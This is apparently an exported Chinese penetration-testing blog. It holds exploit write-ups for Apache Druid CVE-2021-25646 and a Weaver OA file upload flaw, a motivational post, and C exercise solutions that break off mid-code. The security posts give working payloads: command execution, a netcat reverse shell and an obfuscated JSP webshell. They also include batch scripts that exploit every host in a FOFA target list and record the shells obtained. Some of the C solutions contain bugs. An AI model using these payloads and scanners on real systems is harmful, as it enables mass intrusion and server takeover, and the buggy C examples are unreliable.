漏洞环境以及复现\n\nfofa搜索：\n\n```bash\ntitle=\"Apache Druid\"\n```\n\n\n\n**测试漏洞是否存在**\n\n打开第一个网址，访问特定目录，目录存在:\n\n```bash\n/druid/indexer/v1/sampler\n```\n\n\n\n利用bp抓包，发送payload：\n\n```\nPOST /druid/indexer/v1/sampler HTTP/1.1\nHost: xxx.xxx.xxx.xxx​:8888\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0\nAccept: application/json, text/plain, */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nContent-Type: application/json\nContent-Length: 995\nConnection: close\n\n\n{\"type\": \"index\", \"spec\": {\"ioConfig\": {\"type\": \"index\", \"inputSource\": {\"type\": \"inline\", \"data\": \"{\\\"isRobot\\\":true,\\\"channel\\\":\\\"#x\\\",\\\"timestamp\\\":\\\"2021-2-1T14:12:24.050Z\\\",\\\"flags\\\":\\\"x\\\",\\\"isUnpatrolled\\\":false,\\\"page\\\":\\\"1\\\",\\\"diffUrl\\\":\\\"https://xxx.com\\\",\\\"added\\\":1,\\\"comment\\\":\\\"Botskapande Indonesien omdirigering\\\",\\\"commentLength\\\":35,\\\"isNew\\\":true,\\\"isMinor\\\":false,\\\"delta\\\":31,\\\"isAnonymous\\\":true,\\\"user\\\":\\\"Lsjbot\\\",\\\"deltaBucket\\\":0,\\\"deleted\\\":0,\\\"namespace\\\":\\\"Main\\\"}\"}, \"inputFormat\": {\"type\": \"json\", \"keepNullColumns\": true}}, \"dataSchema\": {\"dataSource\": \"sample\", \"timestampSpec\": {\"column\": \"timestamp\", \"format\": \"iso\"}, \"dimensionsSpec\": {}, \"transformSpec\": {\"transforms\": [], \"filter\": {\"type\": \"javascript\", \"dimension\": \"added\", \"function\": \"function(value) {java.lang.Runtime.getRuntime().exec('ping 你的dns平台的地址')}\", \"\": {\"enabled\": true}}}}, \"type\": \"index\", \"tuningConfig\": {\"type\": \"index\"}}, \"samplerConfig\": {\"numRows\": 500, \"timeoutMs\": 15000}}\n\n```\n\n> 注意里面有你的dns平台的地址\n\n\n\n![成功执行](http://image.xpshuai.cn/druid_dnslog.jpg)\n\n\n\n发送请求即可命令执行(替换为自己要执行的命令)\n\n**反弹shell请求包**\n\n```\nPOST /druid/indexer/v1/sampler HTTP/1.1\nHost: xxx.xxx.xxx.xxx​:8888\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0\nAccept: application/json, text/plain, */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nContent-Type: application/json\nContent-Length: 1008\nConnection: close\n\n\n{\"type\": \"index\", \"spec\": {\"ioConfig\": {\"type\": \"index\", \"inputSource\": {\"type\": \"inline\", \"data\": \"{\\\"isRobot\\\":true,\\\"channel\\\":\\\"#x\\\",\\\"timestamp\\\":\\\"2021-2-1T14:12:24.050Z\\\",\\\"flags\\\":\\\"x\\\",\\\"isUnpatrolled\\\":false,\\\"page\\\":\\\"1\\\",\\\"diffUrl\\\":\\\"https://xxx.com\\\",\\\"added\\\":1,\\\"comment\\\":\\\"Botskapande Indonesien omdirigering\\\",\\\"commentLength\\\":35,\\\"isNew\\\":true,\\\"isMinor\\\":false,\\\"delta\\\":31,\\\"isAnonymous\\\":true,\\\"user\\\":\\\"Lsjbot\\\",\\\"deltaBucket\\\":0,\\\"deleted\\\":0,\\\"namespace\\\":\\\"Main\\\"}\"}, \"inputFormat\": {\"type\": \"json\", \"keepNullColumns\": true}}, \"dataSchema\": {\"dataSource\": \"sample\", \"timestampSpec\": {\"column\": \"timestamp\", \"format\": \"iso\"}, \"dimensionsSpec\": {}, \"transformSpec\": {\"transforms\": [], \"filter\": {\"type\": \"javascript\", \"dimension\": \"added\", \"function\": \"function(value) {java.lang.Runtime.getRuntime().exec(' nc xxx.xxx.xxx.xxx 9999 -e /bin/sh')}\", \"\": {\"enabled\": true}}}}, \"type\": \"index\", \"tuningConfig\": {\"type\": \"index\"}}, \"samplerConfig\": {\"numRows\": 500, \"timeoutMs\": 15000}}\n\n```\n\n\n\n\n\n**批量脚本**\n\n```python\nimport click\nimport requests\nimport sys\nimport json\n\nrequests.packages.urllib3.disable_warnings()\n\ndef title():\n    print('+------------------------------------------')\n    print('+  \\033[34mVersion: Apache Druid < 0.20.1                                              \\033[0m')\n    print('+  \\033[36m使用格式:  python3 cve-2021-25646.py                                           \\033[0m')\n    print('+------------------------------------------')\n\n\ndef scan(host):\n    global rep\n    url = str(host)+\"/druid/indexer/v1/sampler\"\n    headers = {\n        \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0\",\n        \"Accept\": \"application/json, text/plain, */*\",\n        \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\",\n        \"Content-Type\": \"application/json\"\n    }\n    payload = {\n        \"type\":\"index\",\n        \"spec\":{\n            \"ioConfig\":{\n                \"type\":\"index\",\n                \"inputSource\":{\n                    \"type\":\"inline\",\n                    \"data\":\"{\\\"isRobot\\\":true,\\\"channel\\\":\\\"#x\\\",\\\"timestamp\\\":\\\"2021-2-1T14:12:24.050Z\\\",\\\"flags\\\":\\\"x\\\",\\\"isUnpatrolled\\\":false,\\\"page\\\":\\\"1\\\",\\\"diffUrl\\\":\\\"https://xxx.com\\\",\\\"added\\\":1,\\\"comment\\\":\\\"Botskapande Indonesien omdirigering\\\",\\\"commentLength\\\":35,\\\"isNew\\\":true,\\\"isMinor\\\":false,\\\"delta\\\":31,\\\"isAnonymous\\\":true,\\\"user\\\":\\\"Lsjbot\\\",\\\"deltaBucket\\\":0,\\\"deleted\\\":0,\\\"namespace\\\":\\\"Main\\\"}\"\n                },\n                \"inputFormat\":{\n                    \"type\":\"json\",\n                    \"keepNullColumns\":True\n                }\n            },\n            \"dataSchema\":{\n                \"dataSource\":\"sample\",\n                \"timestampSpec\":{\n                    \"column\":\"timestamp\",\n                    \"format\":\"iso\"\n                },\n                \"dimensionsSpec\":{\n\n                },\n                \"transformSpec\":{\n                    \"transforms\":[],\n                    \"filter\":{\n                        \"type\":\"javascript\",\n                        \"dimension\":\"added\",\n                        \"function\":\"function(value) {java.lang.Runtime.getRuntime().exec('ping i4l1e3.dnslog.cn')}\",\n                        \"\":{\n                            \"enabled\":True\n                        }\n                    }\n                }\n            },\n            \"type\":\"index\",\n            \"tuningConfig\":{\n                \"type\":\"index\"\n            }\n        },\n        \"samplerConfig\":{\n            \"numRows\":500,\n            \"timeoutMs\":15000\n        }\n    }\n    try:\n        rep = requests.post(url=url, headers=headers, data=json.dumps(payload), timeout=5, verify=False)\n    except:\n        print(\"漏洞不存在\")\n\n    if rep.status_code == 200:\n        print(\"\\033[36m + \" + url + \"漏洞存在，请前往dnslog平台再次确认\")\n        with open(\"druid_漏洞结果.txt\", \"a+\") as f:\n            f.write(url + \"\\n\")\n\n    else:\n        print(\"漏洞不存在\")\n\n\ndef main():\n    title()\n    with open(\"要测试的url.txt\", \"r+\") as f:\n        lines = f.readlines()\n        for line in lines:\n            host = line.strip()\n            scan(host)\n\n\nif __name__ == '__main__':\n    main()\n\n```\n\n\n\n\n\n\n\n\n\n","tags":["CVE-2021-25646"],"categories":["渗透测试"]},{"title":"当你想放弃时","url":"%2Fposts%2F1596%2F","content":"\nHow far you have gone is the thing you should think every time you think of quitting.lt is not how hard the battle is, but how you are fighting to win the battle.In life, you would encounter numerous things that would challenge you.You have to be a soldier of your own fate and your own battle.\n\n\n\n每当你想要放弃, 应该静静想一想。你已经一路坚持走了多远。生活不在于有些战役多么难打。而在于你怎样拼尽全力\n去赢得每一个胜利。在生活中, 你会遇到许许多多的挑战。做一个勇敢的战士,主宰命运,战无不胜。"},{"title":"泛微OA weaver.common.Ctrl 任意文件上传漏洞","url":"%2Fposts%2F20282%2F","content":"\n\n\n### 声明\n\n由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。d\n\n\n\n### 漏洞描述\n\n泛微OA weaver.common.Ctrl 存在任意文件上传漏洞，攻击者通过漏洞可以上传webshell文件控制服务器\n\n\n\n### Fofa\n\n```bash\napp=\"泛微-协同办公OA\"\n```\n\n\n\n\n\n### 复现\n\n漏洞路径为：\n\n```bash\n/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp\n```\n\n\n\n查看发送的数据包：\n\n![](http://image.xpshuai.cn/fwoa_wiershark.jpg)\n\n\n\n使用POC成功上传文件：\n\n![](http://image.xpshuai.cn/fwoa_shell.png)\n\n\n\n\n\n贴上大佬的批量上传POC脚本(我改过的)：\n\n```python\nimport zipfile\nimport random\nimport sys\nimport requests\n\n\n\ndef generate_random_str(randomlength=16):\n  random_str = ''\n  base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'\n  length = len(base_str) - 1\n  for i in range(randomlength):\n    random_str += base_str[random.randint(0, length)]\n  return random_str\n\nmm = generate_random_str(8)\n\nwebshell_name1 = mm+'.jsp'\nwebshell_name2 = '../../../'+webshell_name1\n\ndef file_zip():\n    shell = \"\"\"<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n<%@ page import=\"sun.misc.BASE64Decoder\" %>\n<%\n    if(request.getParameter(\"cmd\")!=null){\n        BASE64Decoder decoder = new BASE64Decoder();\n        Class rt = Class.forName(new String(decoder.decodeBuffer(\"amF2YS5sYW5nLlJ1bnRpbWU=\")));\n        Process e = (Process)\n                rt.getMethod(new String(decoder.decodeBuffer(\"ZXhlYw==\")), String.class).invoke(rt.getMethod(new\n                        String(decoder.decodeBuffer(\"Z2V0UnVudGltZQ==\"))).invoke(null, new\n                        Object[]{}), request.getParameter(\"cmd\") );\n        java.io.InputStream in = e.getInputStream();\n        int a = -1;\n        byte[] b = new byte[2048];\n        out.print(\"<pre>\");\n        while((a=in.read(b))!=-1){\n            out.println(new String(b));\n        }\n        out.print(\"</pre>\");\n    }\n%>\n    \"\"\"   ## 替换shell内容\n    zf = zipfile.ZipFile(mm+'.zip', mode='w', compression=zipfile.ZIP_DEFLATED)\n    zf.writestr(webshell_name2, shell)\n\n\ndef GetShell(urllist):\n    file_zip()\n    print('上传文件中')\n    urls = urllist + '/weaver/weaver.common.Ctrl/.css?arg0=com.cloudstore.api.service.Service_CheckApp&arg1=validateApp'\n    file = [('file1', (mm+'.zip', open(mm + '.zip', 'rb'), 'application/zip'))]\n    requests.post(url=urls,files=file,timeout=60, verify=False)\n    GetShellurl = urllist+'/cloudstore/'+webshell_name1\n    GetShelllist = requests.get(url = GetShellurl)\n    if GetShelllist.status_code == 200:\n        print('利用成功webshell地址为:'+GetShellurl)\n        with open(\"success_webshell.txt\", \"a+\") as f2:\n            f2.write(GetShellurl + \"\\n\")\n    else:\n        print('未找到webshell利用失败')\n\ndef main():\n    # # if (len(sys.argv) == 2):\n    # #     url = sys.argv[1]\n    #     GetShell(url)\n    # else:\n    #     print(\"python3 poc.py http://xx.xx.xx.xx\")\n    with open(\"fofa提取结果文件.txt\", \"r+\") as f:\n        lines = f.readlines()\n        for line in lines:\n            try:\n                GetShell(line.strip())\n            except Exception as e:\n                pass\n\n\nif __name__ == '__main__':\n    main()\n```\n\n![](http://image.xpshuai.cn/fwoa-py.png)\n\n\n\n\n\n\n\n参考大佬文章链接：https://mp.weixin.qq.com/s/ePYRFPfu-pvWMKSiffporA\n\n\n\n","tags":["泛微OA"],"categories":["渗透测试"]},{"title":"C语言简单刷题2(未完)","url":"%2Fposts%2F26260%2F","content":"\n\n\n#### 61.\t求两个数的最大公约数和最小公倍数\n\n```c\n//1.求两个数的最大公约数和最小公倍数\nint min_max(int x, int y)\t\n{\n   //辗转相除法\n\tint tmp;\n\n\t/* 余数不为0，继续相除，直到余数为0 */\n\twhile (x%y != 0)\n\t{\n\t\ttmp = y; //b在下一轮中作为除数，即是下一轮中的a，所以先闪到一边去\n\t\ty = x%y; //a,b的余数作为下一轮中的b,由a%b来取得\n\t\tx = tmp; //刚才tmp中存储了b的值，现在拿出来当做下一轮中的a使用\n\n\t}\n\t\n\treturn y;\n}\n\nvoid min_max_test()\n{\n\tint m,n, min;\n\n\tprintf(\"使用辗转相除法求算\\n\");\n    printf(\"请输入两个整数，如（7 24）：\");\n    scanf(\"%d%d\", &m, &n);\n\n\twhile (m <= 0 || m <= 0)\n    {\n        printf(\"输入有误，请重新输入：\\n\\t\");\n        scanf(\"%d%d\", &m, &n);\n    }\n\n\n\tmin = min_max(m, n);\n\n\tprintf(\"用辗转相除法求得 最大公约数为:%d\\n\", min);\n    printf(\"\\n\\t\\t 最小公倍数为:%d\\n\", m*n / min);\n\n}\n```\n\n\n\n#### 62.在字符串种的所有数字字符前加一个$字符。\n\n例如：输入`ARB23CD45`输`A$1B$2$3CD$4$5`\n\n```c\n#include <string.h>s\n\nvoid add_daola(char *s)\n{\n\tchar tmp[80];\n\tint i, j;\n\n\tfor (i = 0;s[i]; i++)  //复制s数组到t数组中\n\t{\n\t\ttmp[i] = s[i];\n\t}\n\ttmp[i] = '\\0';\n\n\t//遍历\n\tfor (i = 0, j=0; tmp[i]; i++)\n\t{\t\n\t\t//如果遇到数字，前面先把$加入s，再加入数字\n\t\tif(tmp[i] >='0' && tmp[i] <= '9')\n\t\t{\n\t\t\ts[j++] = '$';\n\t\t\ts[j++] = tmp[i];\t\n\t\t}\n\t\t//如果不是数字，则正常加入\n\t\telse\n\t\t\ts[j++] = tmp[i];\n\t}\n\ts[j++] = '\\0';\n}\n\n\nvoid add_daola_test()\n{\n\tchar s[80];\n\tprintf(\"请输入字符串：\");\n\tscanf(\"%s\", s);\n\n\tadd_daola(s); //调用\n\n\tprintf(\"处理结果：\");\n\tputs(s);\n}\n\n```\n\n\n\n\n\n\n\n#### 63.一个整数，它加上100后是个完全平方数，再加上168又是一个完全平方数，请问该数是多少?\n\n```c\n#include <math.h>\n\nvoid full_sqart()\n{\n\tlong int i, x,y,z;\n\tfor (i = 0; i < 10000; i++)\n\t{\n\t\tx = sqrt((double)(i+100));  // x为加上100然后开方后的结果\n\t\ty = sqrt((double)(i+168));\n\n\t\tif(x*x == i+100 && y*y == i+168) //如果一个数的平方根的平方等于该数，......\n\t\t{\n\t\t\tprintf(\"%ld是完全平方数\\n\", i);\n\t\t}\n\t}\n}\n```\n\n\n\n\n\n#### 64.质因数分解: 将一个正整数分解质因数。\n\n如:输入90,打印出90=2\\*3\\*3\\*5.\n\n```c\n//???没太懂\nvoid zzhiyunshu()\n{\n\tint i, n;\n\n\tprintf(\"请输入正整数：\");\n\tscanf(\"%d\", &n);\n\t\n\tfor (i=2; i <= n; i++)\n\t{\n\t\twhile (n != i)\n\t\t{\n\t\t\tif( n % i == 0)\n\t\t\t{\n\t\t\t\tprintf(\"%d*\", i);\n\t\t\t\tn = n/i;   // ???\n\t\t\t}\n\t\t\telse\n\t\t\t\tbreak;\n\t\t}\n\t}\n\tprintf(\"%d\\n\", n);\n}\n\n```\n\n\n\n\n\n#### 65.自由落体求高度问题：\n\n一球从 100米高度自由落下，每后次落地后反跳回原高度的一半再落下， 求它在第10次落地时，共经过多少米?第10次反弹多高?\n\n```c\nvoid drop_heigth()\n{\n\tfloat sn = 100, hn = sn/2;\n\tfor (int i = 0; i <=10; i++)\n\t{\n\t\tsn = sn + 2*hn;  //sn走过的距离(第i次落地时公经过的米数)\n\t\thn = hn /2;      // 第n次反跳高度\n\t}\n\tprintf(\"在第10次落地时，共经过多少米: %f \\n\", sn);\n\tprintf(\"第10次反弹多高：%f \\n\", hn);\n}\n\n```\n\n\n\n\n\n\n\n#### 66.求亲密数\n\n如果整数A的全部因子(包括1，不包括A本身)之和等于B;且整数B的全部因子(包括1,不句括B本身)之和等于A,则将整数A和B称为亲密数。求3000以内的全部亲密数。\n\n```c\n// 对于这类多次将某些值存储到一个变量中时，一定要注意变量赋初值的位置。\n\n\nvoid honey_num()\n{\n\tint a, b, n, i;\n\tfor (a = 1; a < 3000; a++)\n\t{\n\t\tfor (b=0, i = 1; i < a/2; i++)\n\t\t\tif(!(a%i))\n\t\t\t\tb += i;   //将a的因子累加和存到b中\n\n\t\tfor (n=0, i = 1; i < b/2; i++)\n\t\t\tif(!(b%i))\n\t\t\t\tn += i;   //将b的因子累加和存到n中\n\n\t\t//判断\n\t\tif(a == n && a<b)  //使得每对亲密数只输出一次\n\t\t\tprintf(\"%d --- %d\", a,b);  //如果n和a相等，则a和b是一对亲密数\n\t}\n}\n\n```\n\n\n\n67. #### 使用递归逆序输出\n\n利用递归函数调用方式，将所输入的5个字符，以相反顺序打印出来。\n\n```c\n// 方法1：\nvoid revsese_num_out(int n)\n{\n\tchar ch;\n\tif(n <=1)\n\t{\n\t\tch = getchar();\n\t\tputchar(ch);\n\t}\n\telse\n\t{\n\t\tch = getchar();\n\t\trevsese_num_out(n-1);\n\t\tputchar(ch);\n\t}\n}\n\n\n\n\nvoid main()\n{\n\trevsese_num_out(3);\n}\n\n\n\n\n//方法2：\nvoid reverse_str(char *s, int n)\n{\n\tint i;\n\tif((i=n/10) != 0)\n\t\treverse_str(s+1, i);\n\t*s = n%10+'0';\n}\n\n\nvoid main()\n{\n\t\n    int num;\n\n    char str[10]=\"\";\n\n    printf(\"input integer data：\");\n\n    scanf(\"%d\",&num);\n\n\treverse_str(str,num);\n\n    printf(\"output string：\\n\");\n\n    puts(str);\n}\n\n```\n\n\n\n\n\n#### 68.猜年龄问题\n\n有5个人坐在一起，问第五个人多少岁?他说比第4个人大2岁。问第4个人岁数，他说比第3个人大2岁。问第三个人，又说比第2人大两岁。问第2个人，说比第一个人大两岁。最后问第一个人，他说是10岁。请问第五个人多大?\n\n```c\nint guess_age(int n)\n{\n\tif(n ==1)\n\t\treturn 10;\n\telse\n\t\treturn guess_age(n-1) + 2;\n}\n\n\nvoid main()\n{\n\tprintf(\"第5个人年龄: %d \\n\", guess_age(5));\n}\n\n```\n\n\n\n\n\n\n\n#### 69.写一个递归程序求具有n个元素的整型数组R的和\n\n```c\nint get_sum(int R[], int n)\n{\n\tif(n==1)\n\t\treturn R[0];\n\telse\n\t\treturn (R[n-1] + get_sum(R, n-1));\n}\n\nvoid get_sum_test()\n{\n\tint R[5] = {11,22,33,44,55};\n\tprintf(\"求和: %d\", get_sum(R, 5));\n}\n```\n\n\n\n\n\n#### 70.写一个递归程序求具有n个元素的整型数组R中最大值\n\n```c\nint get_max(int R[], int n)\n{\n\tif(n==1)\n\t\treturn R[0];\n\telse\n\t{\n\t\tif(R[n-1] >= get_max(R, n-1))\n\t\t\treturn R[n-1];\n\t\telse\n\t\t\treturn get_max(R, n-1);\n\t}\n\n}\n\nvoid get_max_test()\n{\n\tint R[5] = {11,22,33,44,55};\n\tprintf(\"最大值:%d \\n\", get_max(R, 5));\n\n}\n\n```\n\n\n\n\n\n#### 71.写一个递归程序求具有n个元素的整型数组R的平均值\n\n```c\nint get_avg(int R[], int n)\n{\n\tif( n==1)\n\t\treturn R[0];\n\telse\n\t\treturn(R[n-1]  + get_avg(R,n-1)*(n-1))/n;   //这里不太懂\n\n}\n\nvoid get_avg_test()\n{\n\tint R[5] = {11,22,33,44,55};\n\tprintf(\"平均值:%d \\n\", get_avg(R, 5));\n\n}\n```\n\n\n\n\n\n#### 72.给一个不多于5位的正整数，要求:\n\n一、 求它是几位数，\n\n二、逆序打印出各位数字。\n\n```c\nvoid process_5num()\n{\n\tint num, n=0;\n\tprintf(\"输入一个不超过5位的正整数：\");\n\tscanf(\"%d\", &num);\n\n\tprintf(\"逆序打印: \");\n\twhile (num)\n\t{\n\t\tn++;\n\t\tprintf(\"%d\", num%10);\n\t\tnum = num / 10;\n\t}\n\tprintf(\"\\n位数: %d\", n);\n\n}\n\n// 4%10 = 4\n```\n\n\n\n\n\n#### 73.编写一个递归程序输入一个非负整数，返回返回组成它的数字之和\n\n例如，调DigitSum(1729), 则应该1+7+2+9 它的和是19\n\n```c\nint DigitSum(int n)\n{\n\tif(n==0)\n\t\treturn 0;\n\telse\n\t\treturn (n%10 + DigitSum(n/10));\n}\n\nvoid DigitSum_test()\n{\n\tint num = 1729;\n\tprintf(\"数字之和为：%d\\n\", DigitSum(num));\n\t\n}\n\n```\n\n\n\n\n\n#### 74.有n个整数，使其前面各数顺序向后移动m个位置。最后m个数变成最前面的m个数\n\n> 还是自己写不出来\n\n```c\n//123456\n//m=2\n// 56 1234\n// 6-2+1=5\n\nvoid move(int *x, int n, int m)\n{\n\tint tmp[255];\n\tint i;\n\t// int *p:指针循环变量p\n\tfor (i = 0; i < n; i++)\n\t{\n\t\ttmp[i] = x[i];  //先把arr的值复制给tmp数组一份\n\t}\n\tfor (i = 0; i < m; i++)\n\t{\n\t\tx[i] = tmp[n-m+i];  // 最后m个数变成最前面的m个数  x[0]=tmp[6-2+1]\n\t}\n\tfor (i = m; i <n; i++)\n\t{\n\t\tx[i] = tmp[i-m]; // 前面各数顺序向后移动m个位置   x[2]=tmp[2-2]\n\t}\n}\n\nvoid main()\n{\n\n\tint a[20];\n\tint n,m, i;\n\n\twhile (scanf(\"%d%d\", &n, &m) != EOF)\n\t{\n\t\tfor (i = 0; i < n; i++)\n\t\t{\n\t\t\tscanf(\"%d\", &a[i]);\n\n\t\t}\n\t\tmove(a, n, m);\n\t\tfor (i = 0; i < n; i++)\n\t\t{\n\t\t\tprintf(\"%d  \", a[i]);\n\t\t\t//printf(\"%d\", a[n-i]);\n\t\t\tprintf(\"\\n\");\n\t\t}\n\t}\n\n}\n\n\n```\n\n\n\n#### 75.三天打鱼两天晒网问题\n\n如果个渔夫从2019年1月1日开始每三天打一次渔，两天晒一次网，编程实现当输入2019月1日以后的任意一天，输出该渔夫是在打渔还是在晒网\n\n```c\n// 打渔，打渔，打渔，晒网，晒网\n//自定义函数判断输入年份是否为闰年\nint leap_year(int year)\n{\n\tif(year%4==0 && year%100!=0 || year%400==0)\n\t\treturn 1;\n\telse\n\t\treturn 0;\t\n}\n\n//自定义函数计算距离2019年1月1日共有多少天\nint number(int year, int month, int day)\n{\n\tint sum=0, i,j,k;\n\tint a[12] = {31,28,31,30,31,30,31,31,30,31,30,31}; //存放平年每月的天数\n\tint b[12] = {31,29,31,30,31,30,31,31,30,31,30,31}; //存放闰年每月的天数\n\n\tif(leap_year(year) ==1) //是否为闰年\n\t\tfor (i = 0; i < month-1; i++)\n\t\t{\n\t\t\tsum += b[i];// 是闰年，则累加数组b的前m-1个月份的天数\n\t\t}\n\n\telse\n        for (i = 0; i < month-1; i++)\n        {\n            sum += a[i];// 不是闰年，则累加数组a的前m-1个月份的天数\n        }\n\n\t//\n\t\tfor (j = 2019; j < year; j++)\n\t\t{\n\t\t\tif(leap_year(j) == 1)\n\t\t\t\tsum += 366; //2019年到输入的年份中，是闰年的加366\n\t\t\telse\n\t\t\t\tsum += 365; // 不是闰年的加365\n\t\t}\n\n\t\tsum += day; //前面累加的结果加上日期，求出总天数\n\n\t\treturn day;\n}\n\nvoid fish_main()\n{\n\t//测试函数\n\tint year, month, day, n;\n\tprintf(\"请输入日期: \");\n\tscanf(\"%d%d%d\", &year,&month, &day);\n\n\tn = number(year, month, day); //调用\n\tif((n%5)<4 && (n%5)>0) //余数是1或2或3的时候，说明在打渔，否则在晒网\n\t\tprintf(\"%d-%d-%d 在打渔\", year, month, day);\n\telse\n\t\tprintf(\"%d-%d-%d 在晒网\", year, month, day);\n}\n\n```\n\n\n\n#### 76.八进制转换为十进制\n\n```c\n// 例如，将八进制数字 53627 转换成十进制：\n// 53627 = 5×8^4 + 3×8^3 + 6×8^2 + 2×8^1 + 7×8^0 = 22423（十进制）\n\n// F1.\nvoid o_to_ten()\n{\n\tchar *p, s[6];\n\tint n=0, sum=0; //10进制\n\tint i=0;\n\t\n\tp = s;\n\tgets(p); // 8进制  53627 \n\n\twhile (*(p)!='\\0')\n\t{\n\t\tn = n * 8 + *p - '0';\n\t\tp++;\n\t}\n\n\tprintf(\"%d\",n);\n\n\n}\n\n\n//F1:或者下面这种笨方法\nvoid main()\n{\n\t// a是八进制数字\n\tint a = 53627, count=0, sum=0; \n\tint arr[6] = {};\n\twhile (a)\n\t{\n\t\tprintf(\"%d\\n\", a%10);\n\t\tarr[count] = (a%10)*(int)pow((double)8, count);\n\t\t++count;\n\t\ta = a /10;\n\t}\n\n\tprintf(\"个数: %d\\n\", count);\n\n\tfor (int j = 0; j < 5; j++)\n\t{\n\t\tprintf(\"%d \", arr[j]);\n\t\tsum += arr[j];\n\t}\n\tprintf(\"十进制: %d\\n\", sum);\n\n}\n\n```\n\n\n\n#### 77.有两个磁盘文件A和B,各存放一行字母，要求把这两个文件中的信息合并(按字母顺序排列），输出到一个新文件C中。\n\n解答：将A、B文件中数据读书放到数组中，再对数组进行排序，并输出到文件中\n\n```c\nvoid merge_file()\n{\n\tFILE *fp;\n\tint i,j, n, ni;\n\tchar c[160], t, ch; //用c数组保存合并结果，再把合并结果放到文件c中\n\n\t//读取A文件内容\n\tif((fp=fopen(\"D:\\\\A.txt\", \"r\")) == NULL)\n\t{\n\t\tprintf(\"file A error\");\n\t}\n\n\tprintf(\"\\n A文件内容为: \\n\");\n\tfor(i=0; (ch=fgetc(fp))!=EOF; i++)\n\t{\n\t\tc[i] = ch;\n\t\tputchar(c[i]);\n\t}\n\tfclose(fp);\n\n\t//读取B文件内容\n\tif((fp=fopen(\"D:\\\\B.txt\", \"r\")) == NULL)\n\t{\n\t\tprintf(\"file A error\");\n\t}\n\n\tprintf(\"\\n B文件内容为: \\n\");\n\tfor(i; (ch=fgetc(fp))!=EOF; i++)\n\t{\n\t\tc[i] = ch;\n\t\tputchar(c[i]);\n\t}\n\tfclose(fp);\n\n\n\t//排序\n\tn = i;\n\tfor(i=0; i<n; i++)\n\t{\n\t\tfor(j=i+1; j<n; j++)\n\t\t{\n\t\t\tif(c[i]>c[j])\n\t\t\t{\n\t\t\t\tt = c[i];\n\t\t\t\tc[i] = c[j];\n\t\t\t\tc[j] = t;\n\t\t\t}\n\t\t}\n\t}\n\t//\n\tprintf(\"\\n C文件内容:\\n\");\n\tfp = fopen(\"d:\\\\C.txt\", \"w\");\n\tfor(i=0; i<n; i++)\n\t{\n\t\tputc(c[i], fp);\n\t\tputchar(c[i]);\n\t}\n\tfclose(fp);\n\n\n}\n\n```\n\n\n\n\n\n#### 78.结构体数据的文件写入问题\n\n有五个学生，每个学生有3门课的成绩，从键盘输入以上数据（包括学生县,姓名，二门课成绩)计算出平均成绩，况原有的数据和计算出的平均分数存放在磁盘文件中。\n\n```c\nstruct student\n{\n\tchar num[10];\n\tchar name[8];\n\tint score[3];\n\tfloat avg;\n}stu[5];\n\n\nvoid test_file()\n{\n\tint i,j, sum=0;\n\tFILE *fp;\n\tfor (i = 0; i < 5; i++)\n\t{\n\t\tprintf(\"--->请输出第%d个学生的成绩: \\n\", i+1);\n\t\tprintf(\"学号:\");\n\t\tscanf(\"%s\", stu[i].num);\n\n\t\tprintf(\"姓名:\");\n\t\tscanf(\"%s\", stu[i].name);\n\n\t\t//三科的成绩的录入\n\t\tprintf(\"-->录入成绩: \\n\");\n\t\tfor(j=0; j<3; j++)\n\t\t{\n\t\t\tprintf(\"输入第%d科成绩:\", j+1);\n\t\t\tscanf(\"%d\", &stu[i].score[j]);\n\t\t\tsum += stu[i].score[j];\n\n\t\t}\n\t\tstu[i].avg  = sum/3.0;\n\t}\n\n\t//成绩写入文件中\n\tif((fp=fopen(\"D:\\\\score.txt\",\"w\"))==NULL)\n\t{\n\t\tprintf(\"can't open file\\n\");\n\t\texit(0);\n\t}\n\tfor (int i = 0; i < 5; i++)\n\t{\n\t    if(fwrite(&stu[i], sizeof(struct student), 1, fp) != 1)\n\t\t\tprintf(\"write file error\\n\");\n\t}\n\tfclose(fp);\n\n\n\t//读取文件内容到结构体数据块中\n\tprintf(\"====================================\\n\");\n\tfp=fopen(\"D:\\\\score.txt\",\"r\");\n\tfor (i = 0; i < 5; i++)\n\t{\n\t    fread(&stu[i], sizeof(struct student), 1, fp);\n\t\tprintf(\"学号:%s, 姓名:%s, 分数1:%d, 分数2:%d, 分数3:%d, 平均分:%lf\", stu[i].num, stu[i].name, stu[i].score[0], stu[i].score[1], stu[i].score[2], stu[i].avg);\n\t}\n\tfclose(fp);\n\n}\n```\n\n\n\n\n\n\n\n#### 79.验证歌德巴赫猜想\n\n**问题为:**2000以内的不小于4的正偶数都能够分解为两个素数之和(即验证歌德巴赫猜想对20000以内的正偶数成立)\n\n**分析:**根据问题描述，为了验证歌德巴赫猜想对2000以内的正偶数都是成立的，要将整数分解为两部分，然后判断分解出的两个整数是否均为素数。若是，则满足题意，否则应重新进行分解和判断。\n\n```c\n//先判断是否为素数\nint is_prime(int n)\n{\n    int i;\n    if(n==2)\n        return 1;  /*n是2，返回1*/\n    if(n%2==0)\n        return 0;  /*n是偶数，不是素数，返回0*/\n\tfor(i=3; i<=(int)(double)sqrt((double)n); i+=2)\n        if(n%i==0)\n            return 0;  /*n是奇数，不是素数，返回0*/\n    return 1;  /*n是除2以外的素数返回1*/\n}\n\nvoid gede()\n{\n\tint n, ok, i;\n\n\tint t[102];\n\tt[0] = 6;\n\tint j = 1;\n\tfor (int k = 0; k <=99; ++k)\n\t{\n\t\tt[k + 1] = t[k] + 1;  //只是一个赋初值的过程\n\t}\t\n\n\twhile (j<=99){\n\t//while (scanf(\"%d\", &n) != 